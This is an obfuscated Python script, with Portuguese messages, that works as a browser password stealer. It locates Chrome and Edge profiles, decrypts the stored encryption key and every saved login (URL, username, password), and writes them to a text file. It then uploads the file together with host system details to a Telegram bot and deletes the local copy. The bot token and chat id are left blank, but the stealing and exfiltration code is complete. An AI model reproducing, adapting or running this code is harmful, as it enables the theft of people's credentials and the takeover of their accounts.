h='utf-8';g=enumerate
Q='%s'
O=str
N=open
K=Exception
F=''
B=print
R='%s\\%s\\Login Data'
S='^Profile*|^Default$'
T='decrypted_password.txt'
U='chat_id'
V='document'
L='Loginvault.db'
M='USERPROFILE'
G=None
import os as A,re,requests as W,json,base64 as i,sqlite3 as j,win32crypt as k
from Cryptodome.Cipher import AES
import shutil as l
m=A.path.normpath('%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'%A.environ[M])
X=A.path.normpath('%s\\AppData\\Local\\Google\\Chrome\\User Data'%A.environ[M])
n=A.path.normpath('%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'%A.environ[M])
Y=A.path.normpath('%s\\AppData\\Local\\Microsoft\\Edge\\User Data'%A.environ[M])
def A0(file_path,chat_id,bot_token):
        try:
                C=f"https://api.telegram.org/bot{bot_token}/sendMessage";D={V:N(file_path,'rb')};E={U:chat_id};A=W.post(C,params=E,files=D)
                if A.status_code==200:B('Arquivo enviado com sucesso para o Telegram!')
                else:B(f"Falha ao enviar o arquivo para o Telegram - Status Code: {A.status_code}")
        except K as F:B(f"Erro ao enviar o arquivo para o Telegram: {F}")
def Z(edge=True):
        try:
                if edge:D=n
                else:D=m
                with N(D,'r',encoding=h)as E:C=E.read();C=json.loads(C)
                A=i.b64decode(C['os_crypt']['encrypted_key']);A=A[5:];A=k.CryptUnprotectData(A,G,G,G,0)[1];return A
        except K as F:B(Q%O(F));B('[ERR] Secret key cannot be found');return
def a(ciphertext,secret_key):
        C=ciphertext
        try:D=C[3:15];E=C[15:-16];G=AES.new(secret_key,AES.MODE_GCM,D);A=G.decrypt(E);A=A.decode();return A
        except K as H:B(Q%O(H));B('[ERR] Unable to decrypt. Please check.');return F
def b(db_path):
        try:l.copy2(db_path,L);return j.connect(L)
        except K as A:B(Q%O(A));B('[ERR] Database cannot be found');return
if __name__=='__main__':
        try:
                with N(T,mode='w',encoding=h)as c:
                        d=Z(edge=True)
                        try:
                                e=Z(edge=False);o=[A for A in A.listdir(X)if re.search(S,A)!=G]
                                for p in o:
                                        q=A.path.normpath(R%(X,p));C=b(q)
                                        if e and C:
                                                D=C.cursor();D.execute('SELECT action_url, username_value, password_value FROM logins')
                                                for(r,E)in g(D.fetchall()):
                                                        H=E[0];I=E[1];J=E[2]
                                                        if H!=F and I!=F and J!=F:P=a(J,e);c.write(f"{H}:{I}:{P}\n")
                                                D.close();C.close();A.remove(L)
                        except:B('N tem chrome')
                        s=[A for A in A.listdir(Y)if re.search(S,A)!=G]
                        for t in s:
                                u=A.path.normpath(R%(Y,t));C=b(u)
                                if d and C:
                                        D=C.cursor();D.execute('SELECT origin_url, username_value, password_value FROM logins')
                                        for(r,E)in g(D.fetchall()):
                                                H=E[0];I=E[1];J=E[2]
                                                if H!=F and I!=F and J!=F:P=a(J,d);c.write(f"{H}:{I}:{P}\n")
                                        D.close();C.close();A.remove(L)
        except K as v:B('[ERR] %s'%O(v))
import platform as w
def x(token,chat_id,path_para_documento):B=f"https://api.telegram.org/bot{token}/sendDocument";C={V:N(path_para_documento,'rb')};A=w.uname();D=f"""Novo PC identificado
Name: {A.node}
Release: {A.release}
Version: {A.version}
Arquitetura: {A.machine}""";E={U:chat_id,'caption':D};F=W.post(B,files=C,data=E);return F.json()
y=''
z=''
f=T
A1=x(y,z,f)
A.remove(f)